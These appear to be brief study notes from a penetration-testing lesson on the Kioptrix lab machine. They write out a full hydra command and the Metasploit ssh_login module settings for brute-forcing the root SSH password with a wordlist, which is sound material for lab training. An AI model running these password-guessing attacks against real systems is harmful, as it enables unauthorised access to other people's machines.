Author explains blue team/red team concepts,
where as a blue team he would be as loud as possible, and trigger detections for
assessments.

Author runs the following command:
`hydra -l root -P metasploit/data/wordlists/unix_passwords.txt ssh://<kioptrix_ip> -t 4 -V`

Also runs the module `auxiliary/scanner/ssh/ssh_login` from metasploit. Uses the options:
* RHOSTS = <kioptrix_ip>
* PASS_FILE = <metasploit unix_passwords wordlist>
* USERNAME = root
* VERBOSE = true
